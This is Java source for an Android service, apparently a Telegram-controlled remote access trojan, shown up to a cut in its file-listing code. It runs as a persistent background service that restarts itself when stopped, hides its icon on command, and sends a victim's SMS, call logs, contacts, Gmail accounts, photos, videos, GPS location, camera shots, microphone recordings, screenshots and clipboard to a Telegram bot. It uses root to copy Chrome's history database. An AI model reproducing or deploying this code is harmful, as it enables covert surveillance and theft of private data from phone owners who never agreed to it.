package com.tenix.recon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.view.Surface;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/*
 * inq.java — Zero lambdas, zero anonymous classes.
 * Smali files produced:
 *   inq.smali            (this class + LocationListener)
 *   inq$BootReceiver     (static named inner)
 *   inq$BgTask           (static named inner — all background ops)
 *   inq$CamCallback      (static named inner — all camera2 callbacks)
 */
public class inq extends Service implements LocationListener {

    // ── CONFIG ────────────────────────────────
    static String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    static String OWNER_ID  = "YOUR_CHAT_ID_HERE";
    // ─────────────────────────────────────────

    private static volatile boolean running = false;
    private long lastUpdateId = 0;

    // Location state (used by LocationListener callbacks below)
    private volatile CountDownLatch locLatch = null;
    private volatile Location locResult = null;

    // Path map for Telegram 64-byte callback_data limit
    static final ConcurrentHashMap<String, String> PATH_MAP = new ConcurrentHashMap<>();
    static final AtomicInteger pathCounter = new AtomicInteger(0);

    // ── SERVICE LIFECYCLE ────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        silentForeground();
        if (running) return START_STICKY;
        running = true;
        new Thread(new BgTask(this, BgTask.MAIN_LOOP, "", OWNER_ID)).start();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        scheduleRestart(3000);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent r) {
        scheduleRestart(1000);
        super.onTaskRemoved(r);
    }

    @Override public IBinder onBind(Intent i) { return null; }

    // ── LocationListener (implemented directly on inq — no anonymous class) ──
    @Override
    public void onLocationChanged(Location l) {
        locResult = l;
        CountDownLatch latch = locLatch;
        if (latch != null) latch.countDown();
    }
    @Override public void onStatusChanged(String s, int i, Bundle b) {}
    @Override public void onProviderEnabled(String s) {}
    @Override public void onProviderDisabled(String s) {}

    // ══════════════════════════════════════════════
    //  BgTask — ALL background operations in ONE class
    //  → generates only inq$BgTask.smali
    // ══════════════════════════════════════════════
    static class BgTask implements Runnable {
        static final int MAIN_LOOP=0, PHOTOS=1, VIDEOS=2, LOC=3,
                         SCREENSHOT=4, MIC=5, CAM=6, WALLPAPER=7;

        final inq ref;
        final int task;
        final String arg;
        final String chatId;

        BgTask(inq r, int t, String a, String c) {
            ref = r; task = t; arg = a; chatId = c;
        }

        @Override
        public void run() {
            switch (task) {
                case MAIN_LOOP:   ref.mainLoop();              break;
                case PHOTOS:      ref.sendMedia(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    MediaStore.Images.Media.DATE_ADDED + " DESC",
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    arg.equalsIgnoreCase("all") ? 999 : ref.safeInt(arg, 10), chatId, "photo"); break;
                case VIDEOS:      ref.sendMedia(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    MediaStore.Video.Media.DATE_ADDED + " DESC",
                    MediaStore.Video.Media.DATA,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    arg.equalsIgnoreCase("all") ? 999 : ref.safeInt(arg, 10), chatId, "video"); break;
                case LOC:         ref.sendText(ref.getLocationFresh(), chatId); break;
                case SCREENSHOT:  ref.takeScreenshot(chatId);  break;
                case MIC:         ref.recordMic(ref.safeInt(arg, 10), chatId); break;
                case CAM:         ref.captureCamera(arg.equals("f"), chatId);  break;
                case WALLPAPER:   ref.sendText(ref.setWallpaper(arg), chatId); break;
            }
        }
    }

    // ══════════════════════════════════════════════
    //  CamCallback — ALL Camera2 callbacks in ONE class
    //  → generates only inq$CamCallback.smali
    // ══════════════════════════════════════════════
    @SuppressWarnings("deprecation")
    static class CamCallback extends CameraDevice.StateCallback
            implements CameraCaptureSession.StateCallback,
                       ImageReader.OnImageAvailableListener {

        final inq      ref;
        final String   chatId;
        final Handler  handler;
        final ImageReader reader;
        final CountDownLatch latch;
        final File[]   outFile;
        CameraDevice   device;
        CaptureRequest captureReq;

        CamCallback(inq r, String c, Handler h, ImageReader ir,
                    CountDownLatch l, File[] out) {
            ref = r; chatId = c; handler = h;
            reader = ir; latch = l; outFile = out;
        }

        // CameraDevice.StateCallback
        @Override
        public void onOpened(CameraDevice d) {
            device = d;
            try {
                CaptureRequest.Builder builder =
                    d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                builder.addTarget(reader.getSurface());
                builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                captureReq = builder.build();
                List<Surface> surfaces = new ArrayList<>();
                surfaces.add(reader.getSurface());
                // 'this' as CameraCaptureSession.StateCallback — no anonymous class
                d.createCaptureSession(surfaces, this, handler);
            } catch (Exception e) { latch.countDown(); }
        }
        @Override public void onDisconnected(CameraDevice d) { d.close(); latch.countDown(); }
        @Override public void onError(CameraDevice d, int e) { d.close(); latch.countDown(); }

        // CameraCaptureSession.StateCallback
        @Override
        public void onConfigured(CameraCaptureSession session) {
            try { session.capture(captureReq, null, handler); }
            catch (Exception e) { latch.countDown(); }
        }
        @Override public void onConfigureFailed(CameraCaptureSession s) { latch.countDown(); }

        // ImageReader.OnImageAvailableListener
        @Override
        public void onImageAvailable(ImageReader ir) {
            Image img = ir.acquireLatestImage();
            if (img != null) {
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    File f = new File(ref.getCacheDir(),
                        "cam_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(bytes); fos.close();
                    outFile[0] = f;
                } catch (Exception ignored) {}
            }
            latch.countDown();
        }
    }

    // ── MAIN LOOP ────────────────────────────────
    private void mainLoop() {
        stopForeground(true);
        if (BOT_TOKEN.equals("YOUR_BOT_TOKEN_HERE") || OWNER_ID.equals("YOUR_CHAT_ID_HERE")) {
            running = false; return;
        }
        sendText("🟢 Online v1.1.1\n"
            + Build.MANUFACTURER + " " + Build.MODEL + "\n"
            + "Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n"
            + "Root: " + (hasRoot() ? "✅" : "❌") + "\n\n/help", OWNER_ID);
        while (running) {
            try { pollOnce(); Thread.sleep(2000); }
            catch (InterruptedException e) { break; }
            catch (Exception ignored) {}
        }
        running = false;
    }

    // ── POLL ─────────────────────────────────────
    private void pollOnce() throws Exception {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN
            + "/getUpdates?timeout=25&offset=" + (lastUpdateId + 1);
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(30_000); c.setReadTimeout(30_000);
        int code = c.getResponseCode();
        if (code == 200) {
            BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream(), "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            parseUpdates(sb.toString());
        }
        c.disconnect();
    }

    // ── PARSE UPDATES ────────────────────────────
    private void parseUpdates(String json) {
        int idx = 0;
        while (true) {
            int uPos = json.indexOf("\"update_id\"", idx);
            if (uPos < 0) break;
            int col  = json.indexOf(":", uPos);
            int end  = json.indexOf(",", col);
            if (end < 0) end = json.indexOf("}", col);
            if (end < 0) break;
            long uid;
            try { uid = Long.parseLong(json.substring(col + 1, end).trim()); }
            catch (Exception e) { idx = uPos + 1; continue; }

            int nextU = json.indexOf("\"update_id\"", uPos + 1);
            if (uid > lastUpdateId) {
                lastUpdateId = uid;
                int cbPos = json.indexOf("\"callback_query\"", uPos);
                boolean isCb = cbPos >= 0 && (nextU < 0 || cbPos < nextU);
                if (isCb) {
                    String cbId   = extractStr(json, "\"id\"",   cbPos);
                    String cbData = extractStr(json, "\"data\"", cbPos);
                    String cid    = extractChatId(json, cbPos);
                    if (cbId != null && cbData != null && !cbData.isEmpty())
                        handleCallback(cbId, cbData, cid);
                } else {
                    String text = extractStr(json, "\"text\"", uPos);
                    if (text != null && !text.isEmpty())
                        handleCommand(text, extractChatId(json, uPos));
                }
            }
            idx = uPos + 1;
        }
    }

    private String extractStr(String json, String key, int from) {
        int kPos = json.indexOf(key, from);
        if (kPos < 0) return null;
        int col   = json.indexOf(":", kPos);
        int start = json.indexOf("\"", col + 1) + 1;
        if (start <= 0) return null;
        StringBuilder sb = new StringBuilder();
        int i = start;
        while (i < json.length()) {
            char ch = json.charAt(i);
            if (ch == '"' && json.charAt(i - 1) != '\\') break;
            sb.append(ch); i++;
        }
        return sb.toString();
    }

    private String extractChatId(String json, int from) {
        int chatPos = json.indexOf("\"chat\"", from);
        if (chatPos < 0) return OWNER_ID;
        int idPos = json.indexOf("\"id\"", chatPos);
        if (idPos < 0) return OWNER_ID;
        int col = json.indexOf(":", idPos);
        int end = json.indexOf(",", col);
        if (end < 0) end = json.indexOf("}", col);
        if (end < 0) return OWNER_ID;
        String id = json.substring(col + 1, end).trim();
        return id.isEmpty() ? OWNER_ID : id;
    }

    // ── COMMAND HANDLER ──────────────────────────
    private void handleCommand(String cmd, String chatId) {
        cmd = cmd.trim();
        if      (cmd.startsWith("/info"))      sendText(getDeviceInfo(), chatId);
        else if (cmd.startsWith("/gmail"))     sendText(getGmailAccounts(), chatId);
        else if (cmd.startsWith("/battery"))   sendText(getBatteryInfo(), chatId);
        else if (cmd.startsWith("/net"))       sendText(getNetworkInfo(), chatId);
        else if (cmd.startsWith("/usage"))     sendText(getAppUsage(), chatId);
        else if (cmd.startsWith("/storage"))   sendText(getStorageInfo(), chatId);
        else if (cmd.startsWith("/apk"))       sendText(getInstalledApps(), chatId);
        else if (cmd.startsWith("/running"))   sendText(getRunningApps(), chatId);
        else if (cmd.startsWith("/newapps"))   sendText(getNewApps(), chatId);
        else if (cmd.startsWith("/sms"))       sendText(readSMS(arg(cmd, 10)), chatId);
        else if (cmd.startsWith("/calls"))     sendText(getCallLogs(arg(cmd, 10)), chatId);
        else if (cmd.startsWith("/contacts"))  sendText(getContacts(30), chatId);
        else if (cmd.startsWith("/browser"))   sendText(getBrowserHistory(10), chatId);
        else if (cmd.startsWith("/wifipass"))  sendText(getWifiPasswords(), chatId);
        else if (cmd.startsWith("/running"))   sendText(getRunningApps(), chatId);
        else if (cmd.startsWith("/clipboard")) getClipboard(chatId);
        else if (cmd.startsWith("/reboot"))    reboot(chatId);
        else if (cmd.startsWith("/hide"))      hideIcon(chatId);
        else if (cmd.startsWith("/show"))      showIcon(chatId);
        else if (cmd.startsWith("/help"))      sendText(getHelp(), chatId);
        else if (cmd.startsWith("/toast")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) showToast(p[1], chatId);
        }
        else if (cmd.startsWith("/call")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) makeCall(p[1].trim(), chatId);
        }
        else if (cmd.startsWith("/wallpaper")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) new Thread(new BgTask(this, BgTask.WALLPAPER, p[1].trim(), chatId)).start();
        }
        else if (cmd.startsWith("/photos")) {
            new Thread(new BgTask(this, BgTask.PHOTOS, argStr(cmd, "10"), chatId)).start();
        }
        else if (cmd.startsWith("/videos")) {
            new Thread(new BgTask(this, BgTask.VIDEOS, argStr(cmd, "10"), chatId)).start();
        }
        else if (cmd.startsWith("/loc")) {
            sendText("📍 Getting GPS fix...", chatId);
            new Thread(new BgTask(this, BgTask.LOC, "", chatId)).start();
        }
        else if (cmd.startsWith("/screen")) {
            new Thread(new BgTask(this, BgTask.SCREENSHOT, "", chatId)).start();
        }
        else if (cmd.startsWith("/mic")) {
            new Thread(new BgTask(this, BgTask.MIC, String.valueOf(arg(cmd, 10)), chatId)).start();
        }
        else if (cmd.startsWith("/cam")) {
            String[] p = cmd.split(" ");
            String side = p.length > 1 ? p[1] : "b";
            new Thread(new BgTask(this, BgTask.CAM, side, chatId)).start();
        }
        else if (cmd.startsWith("/flashlight")) {
            String[] p = cmd.split(" ");
            boolean on = p.length < 2 || !p[1].equalsIgnoreCase("off");
            sendText(toggleFlashlight(on), chatId);
        }
        else if (cmd.startsWith("/ls")) {
            String[] p = cmd.split(" ", 2);
            listFilesWithButtons(p.length > 1 ? p[1].trim() : "/sdcard/", chatId);
        }
        else if (cmd.startsWith("/get")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) sendFileCmd(p[1].trim(), chatId);
        }
    }

    // ── CALLBACK HANDLER ─────────────────────────
    private void handleCallback(String cbId, String data, String chatId) {
        answerCallback(cbId);
        if (data.startsWith("ls:")) {
            String key  = data.substring(3);
            String path = PATH_MAP.containsKey(key) ? PATH_MAP.get(key) : key;
            listFilesWithButtons(path, chatId);
        } else if (data.startsWith("get:")) {
            String key  = data.substring(4);
            String path = PATH_MAP.containsKey(key) ? PATH_MAP.get(key) : key;
            sendFileCmd(path, chatId);
        }
    }

    // ══════════════════════════════════════════════
    //  LOCATION — active GPS fix (inq IS the listener)
    // ══════════════════════════════════════════════
    String getLocationFresh() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (lm == null) return "📍 Unavailable";
        locResult = null;
        locLatch  = new CountDownLatch(1);
        HandlerThread ht = new HandlerThread("gps");
        ht.start();
        try {
            boolean gps = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean net = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            if (!gps && !net) return "📍 GPS and Network disabled";
            // 'this' as LocationListener — no anonymous class
            if (gps) {
                try { lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, this, ht.getLooper()); }
                catch (SecurityException ignored) {}
            }
            if (net) {
                try { lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, this, ht.getLooper()); }
                catch (SecurityException ignored) {}
            }
            locLatch.await(15, TimeUnit.SECONDS);
            Location got = locResult;
            if (got != null) return formatLoc(got, false);
            // Fallback to cached
            Location cached = null;
            try { cached = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); }
            catch (SecurityException ignored) {}
            if (cached == null) {
                try { cached = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); }
                catch (SecurityException ignored) {}
            }
            return cached != null ? formatLoc(cached, true) : "📍 Location not available";
        } catch (Exception e) {
            return "📍 Error: " + e.getMessage();
        } finally {
            try { lm.removeUpdates(this); } catch (Exception ignored) {}
            locLatch = null;
            ht.quit();
        }
    }

    private String formatLoc(Location l, boolean cached) {
        return "📍 Location" + (cached ? " (cached)" : "") + "\n\n"
            + "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude()
            + "\nAccuracy: " + (int) l.getAccuracy() + "m"
            + "\nProvider: " + l.getProvider();
    }

    // ══════════════════════════════════════════════
    //  PHONE NUMBER FIX
    // ══════════════════════════════════════════════
    @SuppressWarnings("NewApi")
    private String getPhoneNumber() {
        if (Build.VERSION.SDK_INT >= 22) {
            try {
                android.telephony.SubscriptionManager sm =
                    android.telephony.SubscriptionManager.from(this);
                List<android.telephony.SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                if (subs != null) {
                    for (android.telephony.SubscriptionInfo si : subs) {
                        String n = si.getNumber();
                        if (n != null && !n.trim().isEmpty()) return n;
                    }
                }
            } catch (Exception ignored) {}
        }
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                String n = tm.getLine1Number();
                if (n != null && !n.trim().isEmpty()) return n;
            }
        } catch (Exception ignored) {}
        return "Not available";
    }

    // ══════════════════════════════════════════════
    //  DATA COLLECTION
    // ══════════════════════════════════════════════
    private String getDeviceInfo() {
        StringBuilder sb = new StringBuilder("📱 Device Info\n\n");
        sb.append("Brand: ").append(Build.BRAND).append("\n");
        sb.append("Model: ").append(Build.MODEL).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("Root: ").append(hasRoot() ? "Yes" : "No").append("\n");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) sb.append("Carrier: ").append(tm.getNetworkOperatorName()).append("\n");
        } catch (Exception ignored) {}
        sb.append("Number: ").append(getPhoneNumber());
        return sb.toString();
    }

    private String getGmailAccounts() {
        try {
            android.accounts.Account[] accs =
                android.accounts.AccountManager.get(this).getAccountsByType("com.google");
            if (accs.length == 0) return "📧 No Gmail accounts";
            StringBuilder sb = new StringBuilder("📧 Gmail Accounts\n\n");
            for (int i = 0; i < accs.length; i++)
                sb.append(i + 1).append(". ").append(accs[i].name).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Gmail: " + e.getMessage(); }
    }

    private String getBatteryInfo() {
        try {
            Intent i = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i == null) return "🔋 Unavailable";
            int level   = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale   = i.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int temp    = i.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
            int status  = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            int plugged = i.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            int pct     = scale > 0 ? (int)(level * 100f / scale) : -1;
            String st   = status == BatteryManager.BATTERY_STATUS_CHARGING ? "⚡ Charging" : "🔋 Discharging";
            String src  = plugged == BatteryManager.BATTERY_PLUGGED_USB ? "USB" :
                          plugged == BatteryManager.BATTERY_PLUGGED_AC  ? "AC"  : "None";
            return "🔋 Battery\n\nLevel: " + pct + "%\nStatus: " + st
                + "\nSource: " + src + "\nTemp: " + temp + "°C";
        } catch (Exception e) { return "Battery: " + e.getMessage(); }
    }

    @SuppressWarnings("deprecation")
    private String getNetworkInfo() {
        StringBuilder sb = new StringBuilder("📡 Network\n\n");
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm != null && wm.isWifiEnabled()) {
                WifiInfo wi = wm.getConnectionInfo();
                int ip = wi.getIpAddress();
                sb.append("SSID: ").append(wi.getSSID()).append("\n");
                sb.append("IP: ").append((ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "."
                    + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF)).append("\n");
                sb.append("Signal: ").append(wi.getRssi()).append(" dBm\n\n");
            } else { sb.append("WiFi: Off\n\n"); }
        } catch (Exception ignored) { sb.append("WiFi: Error\n\n"); }
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("Carrier: ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("SIM: ").append(tm.getSimOperatorName()).append("\n");
            }
        } catch (Exception ignored) {}
        sb.append("Number: ").append(getPhoneNumber());
        return sb.toString();
    }

    @SuppressWarnings("NewApi")
    private String getAppUsage() {
        try {
            android.app.usage.UsageStatsManager usm =
                (android.app.usage.UsageStatsManager) getSystemService("usagestats");
            if (usm == null) return "📊 Unavailable";
            long now = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 86400000L, now);
            if (stats == null || stats.isEmpty())
                return "📊 Usage Stats\n\nGrant:\nSettings → Apps → Special Access → Usage Access";
            // Manual insertion sort (descending) — no Comparator lambda
            for (int i = 1; i < stats.size(); i++) {
                android.app.usage.UsageStats key = stats.get(i);
                long keyTime = key.getTotalTimeInForeground();
                int j = i - 1;
                while (j >= 0 && stats.get(j).getTotalTimeInForeground() < keyTime) {
                    stats.set(j + 1, stats.get(j)); j--;
                }
                stats.set(j + 1, key);
            }
            StringBuilder sb = new StringBuilder("📊 App Usage (24h)\n\n");
            int shown = 0;
            for (android.app.usage.UsageStats s : stats) {
                long mins = s.getTotalTimeInForeground() / 60000;
                if (mins < 1) continue;
                sb.append(s.getPackageName()).append(": ").append(mins).append("m\n");
                if (++shown >= 10) break;
            }
            return shown == 0 ? "No usage data" : sb.toString();
        } catch (Exception e) { return "Usage: " + e.getMessage(); }
    }

    @SuppressWarnings("NewApi")
    private String getStorageInfo() {
        try {
            StatFs ext = new StatFs(Environment.getExternalStorageDirectory().getPath());
            StatFs in  = new StatFs(getFilesDir().getPath());
            long et, ef, it, inf;
            if (Build.VERSION.SDK_INT >= 18) {
                et=ext.getTotalBytes()/1048576; ef=ext.getAvailableBytes()/1048576;
                it=in.getTotalBytes()/1048576;  inf=in.getAvailableBytes()/1048576;
            } else {
                et =(long)ext.getBlockCount()*ext.getBlockSize()/1048576;
                ef =(long)ext.getAvailableBlocks()*ext.getBlockSize()/1048576;
                it =(long)in.getBlockCount()*in.getBlockSize()/1048576;
                inf=(long)in.getAvailableBlocks()*in.getBlockSize()/1048576;
            }
            return "💾 Storage\n\nInternal: "+inf+"MB free / "+it+"MB\nExternal: "+ef+"MB free / "+et+"MB";
        } catch (Exception e) { return "Storage: " + e.getMessage(); }
    }

    private String getInstalledApps() {
        try {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder sb = new StringBuilder(); int count = 0;
            for (ApplicationInfo a : apps) {
                if ((a.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    sb.append(a.loadLabel(getPackageManager())).append("\n")
                      .append(a.packageName).append("\n\n");
                    count++;
                }
            }
            return "📦 Apps (" + count + ")\n\n" + sb;
        } catch (Exception e) { return "Apps: " + e.getMessage(); }
    }

    private String getRunningApps() {
        try {
            android.app.ActivityManager am =
                (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am == null) return "⚙️ Unavailable";
            List<android.app.ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            if (procs == null || procs.isEmpty()) return "⚙️ No processes";
            StringBuilder sb = new StringBuilder("⚙️ Running (" + procs.size() + ")\n\n");
            for (android.app.ActivityManager.RunningAppProcessInfo p : procs)
                sb.append(p.processName).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Running: " + e.getMessage(); }
    }

    private String getNewApps() {
        try {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
            long weekAgo = System.currentTimeMillis() - 7 * 24 * 60 * 60 * 1000L;
            StringBuilder sb = new StringBuilder("📲 New Apps (7 days)\n\n"); int count = 0;
            for (ApplicationInfo a : apps) {
                if ((a.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                try {
                    PackageInfo pi = getPackageManager().getPackageInfo(a.packageName, 0);
                    if (pi.firstInstallTime > weekAgo) {
                        sb.append(a.loadLabel(getPackageManager())).append("\n")
                          .append(a.packageName).append("\n\n");
                        count++;
                    }
                } catch (Exception ignored) {}
            }
            return count == 0 ? "📲 No new apps in 7 days" : sb.toString();
        } catch (Exception e) { return "New apps: " + e.getMessage(); }
    }

    private String getBrowserHistory(int count) {
        String[] uris = {
            "content://com.android.browser/bookmarks",
            "content://com.sec.android.app.sbrowser/bookmarks",
            "content://browser/bookmarks",
            "content://com.mi.miui.browser/bookmarks"
        };
        for (String uriStr : uris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uriStr),
                    new String[]{"title","url"}, "visits > 0", null, "date DESC");
                if (c == null) continue;
                StringBuilder sb = new StringBuilder("🌐 Browser History\n\n"); int i = 0;
                while (c.moveToNext() && i < count) {
                    String title = c.getString(0), url = c.getString(1);
                    if (url != null && url.startsWith("http")) {
                        sb.append(title != null && !title.isEmpty() ? title : url)
                          .append("\n").append(url).append("\n\n"); i++;
                    }
                }
                c.close();
                if (i > 0) return sb.toString();
            } catch (Exception ignored) {}
        }
        return getChromeHistoryRoot(count);
    }

    private String getChromeHistoryRoot(int count) {
        String[] paths = {
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.chrome.beta/app_chrome/Default/History"
        };
        for (String src : paths) {
            File dst = new File(getCacheDir(), "tmp_hist.db");
            try {
                if (dst.exists()) dst.delete();
                Process p = Runtime.getRuntime().exec(new String[]{"su","-c",
                    "cp "+src+" "+dst.getAbsolutePath()+" && chmod 644 "+dst.getAbsolutePath()});
                p.waitFor();
                if (!dst.exists() || dst.length() == 0) continue;
                SQLiteDatabase db = SQLiteDatabase.openDatabase(
                    dst.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY);
                Cursor c = db.rawQuery(
                    "SELECT title,url FROM urls ORDER BY last_visit_time DESC LIMIT "+count, null);
                StringBuilder sb = new StringBuilder("🌐 Chrome History\n\n"); int i = 0;
                while (c.moveToNext()) {
                    String title=c.getString(0), url=c.getString(1);
                    if (url!=null) {
                        sb.append(title!=null&&!title.isEmpty()?title:url)
                          .append("\n").append(url).append("\n\n"); i++;
                    }
                }
                c.close(); db.close(); dst.delete();
                if (i > 0) return sb.toString();
            } catch (Exception ignored) { dst.delete(); }
        }
        return "🌐 Browser history not accessible (needs root for Chrome)";
    }

    private String getCallLogs(int count) {
        StringBuilder sb = new StringBuilder("📞 Call Logs\n\n");
        try {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER,CallLog.Calls.TYPE,CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DATE+" DESC");
            if (c == null) return "📞 Unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                int type = c.getInt(1);
                String icon = type==CallLog.Calls.INCOMING_TYPE?"📥":
                              type==CallLog.Calls.OUTGOING_TYPE ?"📤":"📵";
                sb.append(icon).append(" ").append(c.getString(0))
                  .append(" (").append(c.getInt(2)).append("s)\n"); i++;
            }
            c.close();
        } catch (Exception e) { return "Calls: "+e.getMessage(); }
        return sb.toString();
    }

    private String readSMS(int count) {
        StringBuilder sb = new StringBuilder("💬 SMS\n\n");
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),
                new String[]{"address","body"}, null, null, "date DESC");
            if (c == null) return "💬 Unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                sb.append("From: ").append(c.getString(0)).append("\n")
                  .append(c.getString(1)).append("\n\n"); i++;
            }
            c.close();
        } catch (Exception e) { return "SMS: "+e.getMessage(); }
        return sb.toString();
    }

    private String getContacts(int count) {
        StringBuilder sb = new StringBuilder("👤 Contacts\n\n");
        try {
            Cursor c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, null);
            if (c == null) return "👤 Unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append("\n"); i++;
            }
            c.close();
        } catch (Exception e) { return "Contacts: "+e.getMessage(); }
        return sb.toString();
    }

    // ── FILES WITH BUTTONS ───────────────────────
    private void listFilesWithButtons(String path, String chatId) {
        File dir = new File(path);
        if (!dir.exists()) { sendText("📂 Not found: "+path, chatId); return; }
        File[] files = dir.listFiles();
        if (files == null || files.length == 0) { sendText("📂 Empty: "+path, chatId); return; }

        // Manual bubble sort — folders first, then alphabetical (no Comparator lambda)
        for (int pass = 0; pass < files.length - 1; pass++) {
            for (int j = 0; j < files.length - 1 - pass; j++) {
                boolean jIsDir = files[j].isDirectory();
                boolean nIsDir = files[j+1].isDirectory();
                boolean swap;
                if (jIsDir == nIsDir)
                    swap = files[j].getName().compareToIgnoreCase(files[j+1].getName()) > 0;
                else
                    swap = !jIsDir;
                if (swap) { File tmp=files[j]; files[j]=files[j+1]; files[j+1]=tmp; }
            }
        }

        StringBuilder text = new StringBuilder("📂 ").append(path).append("\n\n");
        StringBuilder kb   = new StringBuilder("{\"inline_keyboard\":[");
        int shown = 0;
        for (File f : files) {
            if (shown >= 25) break;
            text.append(f.isDirectory()?"📁 ":"📄 ").append(f.getName());
            if (!f.isDirectory()) text.append(" (").append(f.length()/1024).append("KB)");
            text.append("\n");
            String key = "p" + pathCounter.incrementAndGet();
            PATH_MAP.put(key, f.getAbsolutePath());
            String lbl = (f.isDirectory() ? "📂 " : "📤 ") + truncate(f.getName(), 18);
            String cbd = (f.isDirectory() ? "ls:" : "get:") + key;
